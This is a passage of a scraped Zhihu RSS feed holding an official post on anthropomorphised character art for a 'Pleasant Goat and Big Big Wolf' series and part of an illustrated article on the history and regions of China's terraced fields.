《喜羊羊与灰太狼》是面向全年龄层的经典国民动漫，迄今已经16年，很多观众在羊羊的陪伴下长大了，大家都很好奇长大后的羊狼会是什么样的呢？所以，我们这一次暑假热播新剧《羊村守护者4之决战次时代》正正以未来、成长为主题。</p>\n<p>    每个粉丝朋友的心里都会浮现不一样的“次时代”羊狼，有的观众喜欢羊羊们团队作战，勇敢可爱的一面，有的观众更想看到他们霸气黑化，反差大的一面，于是一些粉丝朋友开始进行同人创作，画出自己心中的“未来羊狼”。而我们作为官方也在密切关注大家的想法，持续开创一些新鲜好玩的花絮彩蛋，决定把基于剧集设定的，羊狼们更多元化的一面展现给大家，为羊狼们长大后的卡通形象，注入“拟人”加工，放大他们在《决战次时代》成长和变化特征，为角色增添一番视觉冲击性，给大家更多的新鲜感、惊喜感。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-043465941f29b57d5eed41ccd03ba7ac_720w.jpg?rss\" data-rawwidth=\"4961\" data-rawheight=\"3543\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>设计创作花絮：<b>当“次时代羊狼”走在拟人的路上</b>\n</h3>\n<p>     在设计《决战次时代》拟人图起初，羊村画师遇到了一个小难题：突出人物，背景要简约一些但是又不失特色。那除了造型外貌之外，在次时代里他们最大的特色是什么？武器装备便是不二之选了。于是画师在每张拟人图的背景里都淡淡地添上了他们的武器，简单得来又保留了完整性，把羊狼们在次时代里的特征特点从外貌穿着到装备都展示出来，即使是小灰灰，也有属于自己的“热能棒”和蓝牙耳机。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c017947427d13dab754d9ffe602942e8_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"5333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c017947427d13dab754d9ffe602942e8\" data-watermark-src=\"v2-075b85bd31fe11e94a2c956ed2c6fb5f\" data-private-watermark-src=\"v2-5531cd1628d42dba73bc8c593446ae90\"></p>\n<p>      让画师纠结最久的是红太狼。其实画师们在作画时，为红太狼画过两个表情嘴巴，第一感觉是冷酷的嘴巴，后来觉得太酷了需要加点笑容，显得魅力御姐一些。但经过几思考讨论后，画师们一致认为特工化后的红太狼对喜怒哀乐的情感感知其实并不明显的，在执行任务的状态外形下，并无情感，只有在被灰太狼暖化后才露出久违的微笑，而拟人图里更想要凸出的是红太狼特工时期的冷酷、快准狠，升级版“狼女王”的设定，因此最终回到了最初的第一直觉----呈现无情冷酷美艳特工的拟人红太狼。     </p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce3d57cc94f2cf815d532f6e0d89b729_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"5333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>       为什么次时代拟人图里喜羊羊会比小伙伴们都矮？“人家还是小孩子嘛~”在《决战次时代》里，十五年前的喜羊羊与灰太狼意外来到十五年后的“次时代”青青草原，遇到长大后的伙伴，开启了新的守护之战。这是剧集的重要开端，也是画师们设计时一个不可跳脱的设定，于是创作了这个还是少年时期的喜羊羊拟人。至于真正长大后的喜羊羊还是要留白给大家，发挥想象力，你们喜欢的喜羊羊是什么样子的，长大后的他就是什么样子啦！</p>\n<h3><b>多样每一次官拟都会碰撞出新一种火花</b></h3>\n<p>      早在《羊村守护者3之异国大营救》，我们便开始尝试结合剧集风格设定，绘制角色拟人图，当猫变成宫廷公主，当羊变成国风少年，想象力与中国风的碰撞，给大家带来了别样的角色拟人形象。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8c227aa61e71f4796b853108b78b7f15_720w.jpg?rss\" data-rawwidth=\"3425\" data-rawheight=\"4961\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>        在8月3日《喜羊羊与灰太狼》十六周年时，我们发布了《运动英雄传之筐出胜利》全员拟人手书短片 ，实现从拟人静态图到微动画手书，是我们近期做的一次比较大的尝试。许多粉丝观众前来热情三连，感受来自赛场上的一番热血，运动风的羊狼拟人手书记录了他们高光的一刻，向大家展示了羊狼们的少年气盛和在球赛里拼搏的英姿，更“接地气”地与少年，成年人们产生追逐篮球梦的共鸣。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b31dcc234ae1a64a0929e5c2d670af07_720w.jpg?rss\" data-rawwidth=\"4961\" data-rawheight=\"3543\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xi-yang-yang-yu-hui-tai-lang-48-12?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">喜羊羊与灰太狼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482367510/answer/2085103610?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">492 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/367050319?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价喜羊羊系列新作《奇趣外星客》？</a><br><a href=\"http://www.zhihu.com/question/381190243?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">老版猪猪侠和新版猪猪侠，哪个更好看？</a><br>\n","link":"http://www.zhihu.com/question/482367510/answer/2085103610?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国有哪些很美的梯田？","date":"2021-08-26 04:01:32","description":"\n<p>8亿亩梯田——中国最美的山岭雕刻，请查收！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3cc15c59eee2de55f3b436c642934052_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1693\" data-watermark=\"original\" data-original-src=\"v2-3cc15c59eee2de55f3b436c642934052\" data-watermark-src=\"v2-49cf63ffa510b0b373abe4cff89323a2\" data-private-watermark-src=\"v2-ea2f3754813e2a87e8177a38194bc662\"></p>\n<p>你也许无法想象，在中国约20亿亩的总耕地面积中，居然超过1/4都是<b>梯田。</b></p>\n<p>中国不仅是全球梯田面积最大的国家，还是全球梯田类型最多、分布区域最广的国家。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-edad9ae53ae414f57ec068ba1273c3e7_720w.webp?rss\" data-caption=\"不同口径下统计我国梯田面积数据存在差异，本文依据清华大学地球系统科学系俞乐课题组遥感测量数据，即8亿亩左右，图为中国梯田分布示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1890\" data-watermark=\"original\" data-original-src=\"v2-edad9ae53ae414f57ec068ba1273c3e7\" data-watermark-src=\"v2-3cab234e2fcf3d582855ee5ac6b394d4\" data-private-watermark-src=\"v2-7b4a1078ac3c1900316de44cc6f4e52e\"></p>\n<p>尽管梯田的踪影遍布全球，但中国千百年来的农耕智慧，把梯田发挥到了极致。</p>\n<p>著名的广西<b>龙脊梯田，</b>层级最多达1100余级，最大垂直落差860余米。从远处眺望，密密麻麻的曲线令人震撼。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-61a2e4fd8cb50b6a728f453d996a86a2_720w.jpg?rss\" data-caption=\"广西龙胜龙脊梯田，摄影师@何旭龙\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"3881\" data-watermark=\"original\" data-original-src=\"v2-61a2e4fd8cb50b6a728f453d996a86a2\" data-watermark-src=\"v2-d374838ef5c40a69aedaff0bb1e5b05d\" data-private-watermark-src=\"v2-fc7bc6e1f5062c22e10cf77b1e7bf040\"></p>\n<p>但这还不是最震撼的。</p>\n<p>位于云南的<b>哈尼梯田，</b>总面积更是夸张到超过100万亩，层级从上到下多达3000余级，最大垂直落差2000余米。</p>\n<p>如果游客想从山脚的梯田走到最高处的梯田，几乎相当于攀爬一次华山。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-56df6b6831a35ec1465aa2bea6066c08_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@嘉楠\" data-size=\"normal\" data-rawwidth=\"998\" data-rawheight=\"2000\" data-watermark=\"original\" data-original-src=\"v2-56df6b6831a35ec1465aa2bea6066c08\" data-watermark-src=\"v2-6752ee8b529cc7debcea93db5287d7d8\" data-private-watermark-src=\"v2-6387c9d3f0501bf69e47bf613a6eab60\"></p>\n<p>我们的祖先为什么要建设如此壮观的梯田？其中隐藏着怎样的生存智慧？</p>\n<p>在星球研究所看来，这些梯田既是绵延起伏的风景，是重塑山地的艺术，更是山地之中无数族群奋斗上千年的史册，是改变族群命运的层层阶梯。</p>\n<hr>\n<h2><b>01 诞生</b></h2>\n<p>早在西周时期，随着平原上人口增加，一部分人便开始开垦丘陵坡地。</p>\n<p>在都城镐（hào）京（今西安）周边，人们清除坡地上原有的植被，种植果树和作物。《诗经·正月》唱道：<b>「瞻彼阪</b>（bǎn）<b>田，有菀</b>（wǎn）<b>其特」，</b>即「看山坡的田地里，禾苗长得多茂盛」。</p>\n<p>不过，这时的坡地种植更多的是顺坡就势，并没有形成一层层上下分割明显的台阶。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-00f535898d7db89f45416643bfd6d897_720w.webp?rss\" data-caption=\"新疆江布拉克山坡上的麦田，仅作示意，摄影师@飞翔\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-00f535898d7db89f45416643bfd6d897\" data-watermark-src=\"v2-45c893665a395185d4932822cb6e211b\" data-private-watermark-src=\"v2-dedf848b4707af9cde2af4973ad823eb\"></p>\n<p>到了汉代，随着牛耕和铁器的普及，人们拥有了可以改造山地丘陵的更大力量。</p>\n<p>在黄土高原的南部山区以及四川盆地的坡地上，人们用农具修建出田埂沟渠，逐渐形成了台阶状的田地。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-cfc84b35d6cc8fe26348259d6d1d2039_720w.webp?rss\" data-caption=\"东汉陶水田，出土于四川东汉墓，是我国最早与梯田相关的文物证据之一，现存于南京博物院，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1331\" data-watermark=\"original\" data-original-src=\"v2-cfc84b35d6cc8fe26348259d6d1d2039\" data-watermark-src=\"v2-de591523800c2e221c00a1b37f286819\" data-private-watermark-src=\"v2-738c305f7bc8ac662ff1599fbb5e9407\"></p>\n<p>在不断地改造山地的过程中，<b>原始的梯田</b>便诞生了。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-426d9ae64951e5126001246904d326ca_720w.gif?rss\" data-caption=\"梯田的演变过程示意，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1482\" data-watermark=\"original\" data-original-src=\"v2-426d9ae64951e5126001246904d326ca\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不过，北方及四川盆地平地相对较多，此时梯田的开发并不突出。但随着此后中原地区不断的王朝更迭、战乱频仍，北方汉族被迫大量向南方迁徙，梯田逐渐开始在山地众多的<b>南方</b>大展身手。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b4767c4a9b3d5d69b504f662e9b3dcf_720w.webp?rss\" data-caption=\"湖南新化紫鹊界梯田，摄影师@柳勇\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-0b4767c4a9b3d5d69b504f662e9b3dcf\" data-watermark-src=\"v2-15c494283ec64d301130a07fea1488de\" data-private-watermark-src=\"v2-0f1dcfe4393ccc35f4914d2d0e6653ba\"></p>\n<p>由于南方降水更多，梯田的建设反而比北方拥有更大的优势，山地间丰沛的地下水、随处流淌的山溪为梯田提供了充足的水源，而当水源灌满梯田，又与需水量极大的<b>水稻</b>相遇，形成<b>「梯田-水稻」</b>的绝佳搭档，并逐渐成为南方最主要的农业模式之一。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d29cc89dce652628f03978bb234c6e97_720w.gif?rss\" data-caption=\"梯田引水灌溉过程示意，制图@王申雯&amp;amp;陈随/星球研究所\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"961\" data-watermark=\"original\" data-original-src=\"v2-d29cc89dce652628f03978bb234c6e97\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在黄山山脉、天目山等山地纵横的<b>古徽州</b>地区，移民们开垦出<b>婺源江岭梯田、篁岭梯田</b>等。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1f4333627f50bcff191997f41d0154b7_720w.webp?rss\" data-caption=\"江西婺源江岭梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"1481\" data-watermark=\"original\" data-original-src=\"v2-1f4333627f50bcff191997f41d0154b7\" data-watermark-src=\"v2-48556bbe3a2c7d1c360cf07847433ef5\" data-private-watermark-src=\"v2-13bfb656f2518a03d5ca4b5320e26451\"></p>\n<p>他们还在这里实施<b>水稻-油菜轮作</b>以提升土地利用率，获取油料资源。</p>\n<p>每年秋季水稻收获后便开始种植油菜，到了次年三四月份，油菜花开，大地金黄，再加上粉墙黛瓦，峰峦峻峭之间薄雾绵绵，如同世外桃源。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-089941cc1f8f0ad0b91c72feab0a67c0_720w.webp?rss\" data-caption=\"村寨与油菜梯田在婺源土地上错落相间，摄影师@李程光\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2118\" data-watermark=\"original\" data-original-src=\"v2-089941cc1f8f0ad0b91c72feab0a67c0\" data-watermark-src=\"v2-8adb096ab2338a602fca5ceb6f2cdd8c\" data-private-watermark-src=\"v2-66257af9fea171a5619a304c7ddcf4df\"></p>\n<p>而在以山多著称的<b>福建，</b>自古就有「八山一水一分田」的说法。</p>\n<p>自唐朝中期起，大量北方移民在福建尤溪县境内开荒筑田，逐渐在重峦叠嶂之中开垦出气势磅礴的登天之梯，<b>尤溪联合梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d8237c45288a98595825bfbbb1006f09_720w.webp?rss\" data-caption=\"福建尤溪联合梯田，摄影师@赵必然\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-d8237c45288a98595825bfbbb1006f09\" data-watermark-src=\"v2-2e9beb89d01a028fc825bbd6376c9598\" data-private-watermark-src=\"v2-3584b9dccbcc3933bb0ddc21550d5776\"></p>\n<p>在<b>江西南部，</b>由于易于耕作的平原地区已经被更早到达的移民所占据，晚到的<b>客家人</b>只能在山地之上开垦梯田。</p>\n<p>其中位于赣州市崇义县的<b>上堡梯田，</b>面积超过2万亩，最高海拔可达1200米，为面积最大的客家梯田。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-38c38e050a5fe0b8992eccfe9de458f7_720w.webp?rss\" data-caption=\"江西崇义上堡梯田，摄影师@陈彦\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-38c38e050a5fe0b8992eccfe9de458f7\" data-watermark-src=\"v2-ca8ce1fe6a4b67d2293ccbcfd0b260e6\" data-private-watermark-src=\"v2-10bcf502fe334a84c01ecb5128af2a8f\"></p>\n<p>从空中俯瞰，或顺山势逐级下降，</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d6f230c5b43f5dc2c4f96ef16e251a8_720w.webp?rss\" data-caption=\"初春之时，尚未进行插秧的上堡梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2044\" data-watermark=\"original\" data-original-src=\"v2-4d6f230c5b43f5dc2c4f96ef16e251a8\" data-watermark-src=\"v2-da2dc81d213b35473d7e11a24597bc21\" data-private-watermark-src=\"v2-acd5a14379146d22d4464a1aab6e54b5\"></p>\n<p>或蜿蜒盘旋，如同一个巨大的漩涡。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-631b672682fa2dcad666cf3e7b1803f4_720w.webp?rss\" data-caption=\"江西崇义上堡梯田，摄影师@陈彦\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-631b672682fa2dcad666cf3e7b1803f4\" data-watermark-src=\"v2-4d55f30758a17555534dfb28161446fa\" data-private-watermark-src=\"v2-1d5736408b508034ba6f472af056abc5\"></p>\n<p>而在江西的其他地方，以及福建、广东等地，客家人的梯田同样遍布。例如福建<b>永定梯田</b>、江西<b>西向梯田、</b>江西<b>遂川梯田、</b>广东<b>坪山梯田、</b>广东<b>五山梯田</b>、广东<b>清溪梯田</b>等等。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ce42f3f7eb8f9caca6408f08458731cb_720w.webp?rss\" data-caption=\"福建永定初溪土楼附近的梯田，摄影师@李艺爽\" data-size=\"normal\" data-rawwidth=\"1065\" data-rawheight=\"1786\" data-watermark=\"original\" data-original-src=\"v2-ce42f3f7eb8f9caca6408f08458731cb\" data-watermark-src=\"v2-d9e5a1092318db210d299a92e67d14d3\" data-private-watermark-src=\"v2-981e28df6a3d0f992ea9b3413e995d27\"></p>\n<p>这些地方经济相对富庶，除种植传统的粮食作物外，茶树、桑树、桃树等经济作物同样成为梯田的主角，形成茶园梯田、桑园梯田、果树梯田等。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b1829d90b1f3435a5e7afaae49ca3b33_720w.jpg?rss\" data-caption=\"雪后的浙江武义高山茶园梯田，摄影师@项新平\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-b1829d90b1f3435a5e7afaae49ca3b33\" data-watermark-src=\"v2-4757de8e3796587b3a43da7cf7555acd\" data-private-watermark-src=\"v2-78722d7a60afcc0b7e5501629132f65d\"></p>\n<p>到了明清时期，中国古代人口达到顶峰，苛捐杂税、土地兼并，大量农民被逼上了更加人迹罕至的山区并因居住在简陋的茅棚之中，而被称为<b>棚民。</b></p>\n<p>在位于秦巴山区的陕西汉阴县，棚民及其后代开垦出了<b>凤堰古梯田。</b></p>\n<p>（陕西汉阴凤堰古梯田，图片来源@视觉中国）</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4e2153556af09252c56aa1030685e21f_720w.webp?rss\" data-caption=\"陕西汉阴凤堰古梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2212\" data-watermark=\"original\" data-original-src=\"v2-4e2153556af09252c56aa1030685e21f\" data-watermark-src=\"v2-c01d7f3676d13a4814329081c1cee17b\" data-private-watermark-src=\"v2-929e3fc4984f7a5daae7217507915c12\"></p>\n<p>这里地处中国自然地理的南北分界线，除了水田，还大量种植小麦、玉米、番薯等旱地作物，形成水旱间作、南北兼顾的特色。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6d624cca9f595adbcbea6a249c02534c_720w.jpg?rss\" data-caption=\"凤堰古梯田，可以看到水田、旱田同时存在，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-6d624cca9f595adbcbea6a249c02534c\" data-watermark-src=\"v2-206927df7df3b926fa5821e4d1ad9e61\" data-private-watermark-src=\"v2-d5094ff8082dea485903d9743ef47661\"></p>\n<p>众多梯田的开发也对山地中的土著部落产生了影响。</p>\n<p><b>畲（</b>shē）<b>族</b>的先祖居住在浙闽山区，本意即为通过放火烧荒获得耕地，而随着梯田技术的传播，畲田逐渐被梯田替代。</p>\n<p>在浙江南部的云和县，由畲族与汉族共同开垦的<b>云和梯田，</b>在山谷中蜿蜒迂回、连绵不断，多达700多级。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e19444fea874155bfeb8273bb7c76369_720w.webp?rss\" data-caption=\"浙江丽水云和梯田，摄影师@张进\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e19444fea874155bfeb8273bb7c76369\" data-watermark-src=\"v2-2ef2c7e1786e7d44aa71332853d0d062\" data-private-watermark-src=\"v2-ebb2d9f65d676e380b901eb03f671aa3\"></p>\n<p>即使历经1200多年的时光，也依旧是盛产稻谷的良田，是云雾之上壮丽的人类风景。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2b88424a815e8f9bd24b8dbafaf49ae4_720w.jpg?rss\" data-caption=\"浙江丽水云和梯田，摄影师@段黄德\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2421\" data-watermark=\"original\" data-original-src=\"v2-2b88424a815e8f9bd24b8dbafaf49ae4\" data-watermark-src=\"v2-177d49130a69206958b8fff9693c3ac2\" data-private-watermark-src=\"v2-70130d755bda10af0342e7e3817bc2a0\"></p>\n<p>至此，梯田从北方起源并扩散至南方山地，而随着大量人口向西南地区拓展，古代梯田开发的巅峰</p>\n<p>才真正到来。</p>\n<p>它将在面积、层级、坡度等诸多方面全面胜出，形成无人能及的梯田王国。</p>\n<hr>\n<h2><b>02 壮大</b></h2>\n<p>在广义的<b>西南地区，</b>山地更多，且更加高大，生活在此的民族也更加多样。面对人多地少的生存压力，梯田被发挥到极致。</p>\n<p>作为中国第二、三级阶梯分界线的<b>雪峰山脉，</b>在湖南新化县绵延。这里山势陡峭，苗、瑶、侗、汉等族居民在此修筑<b>紫鹊界梯田，</b>其坡度高达25°-40°，最大则超过50°。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b54a7316b4df03f5fa8f79e0e0b50251_720w.jpg?rss\" data-caption=\"湖南新化紫鹊界梯田，摄影师@俞琳\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-b54a7316b4df03f5fa8f79e0e0b50251\" data-watermark-src=\"v2-c952a0c6aa743c7f031a78c4ed78ca48\" data-private-watermark-src=\"v2-1a28a3d025c89c77b62bd4a598d4eee4\"></p>\n<p>历经千年之后，梯田总面积多达8万亩，相当于7千多个标准足球场，山地间梯田遍布、云海蒸腾。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2f3424cc2b6ec9f4c9f96bf1cec6a166_720w.webp?rss\" data-caption=\"浸浴在云雾之中的紫鹊界梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1616\" data-watermark=\"original\" data-original-src=\"v2-2f3424cc2b6ec9f4c9f96bf1cec6a166\" data-watermark-src=\"v2-b020c4893c10365a4532e8f369cb2aae\" data-private-watermark-src=\"v2-3c05e97ac8cabe22074e30fb37f9d0a3\"></p>\n<p>此外，在贵州从江县月亮山腹地，侗族、苗族和壮族聚居于此，共同修筑了壮观的<b>加榜梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-142a4c6feb3f7702b2c3da5749573d3a_720w.webp?rss\" data-caption=\"放学的孩子，沿着加榜梯田的田埂归家，摄影师@老西关\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1605\" data-watermark=\"original\" data-original-src=\"v2-142a4c6feb3f7702b2c3da5749573d3a\" data-watermark-src=\"v2-6da0da38b4e84b126eebc8c883216e62\" data-private-watermark-src=\"v2-558c3fdc4cfda8ea346c31fc82c9ad77\"></p>\n<p>梯田中，农民们放养鱼、鸭，稻田为鱼、鸭供觅食场所，鱼、鸭捕食昆虫减少水稻病虫害，鱼粪鸭粪又促进水稻生长，从而构成了一个高效的<b>「稻鱼鸭共生系统」。</b></p>\n<p>为此，当地人有意加高田埂，从而提高稻田蓄水量、载鱼量。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e75ea37665748a8fd25423831e81cfdd_720w.webp?rss\" data-caption=\"梯田之中饲养的鸭子与较高的田埂，摄影师@崔永江\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1585\" data-watermark=\"original\" data-original-src=\"v2-e75ea37665748a8fd25423831e81cfdd\" data-watermark-src=\"v2-04b547731c8981d586c3a1ffe5eb9371\" data-private-watermark-src=\"v2-6d2a44eb37dd49a3e6ae598326a1264f\"></p>\n<p>在广西桂林龙胜县，壮族、瑶族共同开拓出最多层级达1100多级的<b>龙脊梯田，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-827b7bf5239dabd353ad5852d2744fae_720w.webp?rss\" data-caption=\"广西龙胜龙脊梯田，摄影师@吕凤霄\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1923\" data-watermark=\"original\" data-original-src=\"v2-827b7bf5239dabd353ad5852d2744fae\" data-watermark-src=\"v2-cece1ae01f4585b305a00837f84be245\" data-private-watermark-src=\"v2-11c12d937f3314434bbec2c66b4402e8\"></p>\n<p>他们在崇山峻岭之中依靠血肉之躯，养育了一代代的子孙。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c07ac10f597792ae88ce7dd4b4a9fd6f_720w.webp?rss\" data-caption=\"红瑶居民正在龙脊梯田之中耕作，当地红瑶因穿红色服装而得名，也被誉为「桃花林中的民族」，摄影师@Jan\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-c07ac10f597792ae88ce7dd4b4a9fd6f\" data-watermark-src=\"v2-5eeb8e398b01cf2b6c1cd62f0c64e782\" data-private-watermark-src=\"v2-05c32ab6ec813e412107cb12591431c9\"></p>\n<p>层层叠叠的梯田，如潮水般在群山间涌动。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d719aa07325607ef8804157ff28202e5_720w.webp?rss\" data-caption=\"群山环绕下的龙脊梯田与少数民族民居，摄影师@林昉\" data-size=\"normal\" data-rawwidth=\"941\" data-rawheight=\"3000\" data-watermark=\"original\" data-original-src=\"v2-d719aa07325607ef8804157ff28202e5\" data-watermark-src=\"v2-560b10931873c58d68aede4e51aaa645\" data-private-watermark-src=\"v2-2430c6fc570e513aeeda0f3212107195\"></p>\n<p>而最壮观的则莫过于位于云南元阳、绿春、红河、金平等县的——<b>哈尼梯田。</b></p>\n<p>两千多年前，西北氐羌族群的一部分开始了漫长地向南迁徙。他们最终到达云南哀牢山南段，形成了如今的<b>哈尼族。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-67542440b301e1d4358f8a6bc886b0d3_720w.gif?rss\" data-caption=\"哈尼族迁徙路线示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-67542440b301e1d4358f8a6bc886b0d3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在这里，虽然终结了千年的漂泊，但在与其他的民族竞争中，哈尼族不得不离开平地，走向了大山深处。</p>\n<p>正如他们的吟唱：<i><b>我们哈尼人，经历了数不尽的灾难，平平的坝子虽然好，天灾人祸太多我们不能在。</b></i>（哈尼族歌谣，转引自《红河哈尼梯田形成史调查和推测》）</p>\n<p>于是在神灵的指引下：<b><i>从老鼠那里学会了种植，从...大猪那里学会了翻地，从...水牛那里学会了开田，从此哈尼人再也离不开梯田和水。</i></b>（哈尼族歌谣，转引自《云南红河哈尼稻作梯田系统》）</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-374e8e3a8a18e35b17005d9b6561dd38_720w.jpg?rss\" data-caption=\"云南将平坦的山间盆地称为坝子；图为元阳哈尼族「四季梯田」实景演出，表现其民族迁徙及山地生存方式，摄影师@戴云良\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-374e8e3a8a18e35b17005d9b6561dd38\" data-watermark-src=\"v2-79b15cf4b124f4aa85555c63f40cffcd\" data-private-watermark-src=\"v2-5c7116dbd1a2de8f9b8210c888ee5099\"></p>\n<p>哈尼梯田系统一般由四个部分组成，即<b>「森林-村寨-梯田-水系」</b>四素同构。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ed79ed5dae4cbfeffd352626885d993c_720w.webp?rss\" data-caption=\"哈尼梯田四素同构景观示意，我国南方大部分水作梯田也有类似的景观分布，制图@王申雯&amp;amp;陈随/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1546\" data-watermark=\"original\" data-original-src=\"v2-ed79ed5dae4cbfeffd352626885d993c\" 